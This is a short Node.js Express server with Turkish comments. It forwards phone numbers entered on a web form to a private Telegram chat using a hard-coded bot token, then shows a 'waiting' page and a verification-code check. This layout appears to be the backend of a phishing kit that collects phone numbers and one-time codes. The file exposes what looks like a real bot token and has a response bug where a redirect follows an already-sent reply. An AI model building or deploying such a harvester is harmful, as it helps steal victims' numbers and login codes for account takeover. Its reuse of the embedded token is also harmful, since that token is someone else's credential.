const express = require('express');
const https = require('https');
const bodyParser = require('body-parser');
const app = express();

// Telegram bot token ve chat ID
const BOT_TOKEN = '1592715049:AAEAlNd3eZAVAkAHZeaHbUeGD_bek5B9FKw';
const CHAT_ID = '1574668027';

// Express.js için JSON veri alabilme
app.use(bodyParser.json());
app.use(express.static('public')); // Statik dosyalar için public klasörünü kullan

// Telefon numarasını Telegram botuna gönderme
app.post('/send-phone', (req, res) => {
    const { phone } = req.body;

    if (!phone) {
        return res.status(400).send('Telefon numarası eksik');
    }

    const message = `Yeni telefon numarası: ${phone}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = JSON.stringify({
        chat_id: CHAT_ID,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const reqTelegram = https.request(options, (response) => {
        let data = '';
        response.on('data', (chunk) => {
            data += chunk;
        });

        response.on('end', () => {
            const jsonResponse = JSON.parse(data);
            if (jsonResponse.ok) {
                res.status(200).send('Telefon numarası Telegram botuna gönderildi');
                // Bekleme sayfasına yönlendir
                res.redirect('/waiting.html');
            } else {
                res.status(500).send('Telegram API hatası');
            }
        });
    });

    reqTelegram.on('error', (error) => {
        res.status(500).send('Sunucu hatası');
    });

    reqTelegram.write(payload);
    reqTelegram.end();
});

// Kod doğrulama isteği
app.post('/verify-code', (req, res) => {
    const { code } = req.body;
    // Doğrulama işlemini buraya ekleyin (örneğin, kodu kontrol etme)
    if (code === '12345') { // Örnek kod kontrolü
        res.status(200).json({ status: 'success' });
    } else {
        res.status(400).json({ status: 'error' });
    }
});

// Sunucu başlatma
const port = 5000;
app.listen(port, () => {
    console.log(`Sunucu ${port} portunda çalışıyor`);
});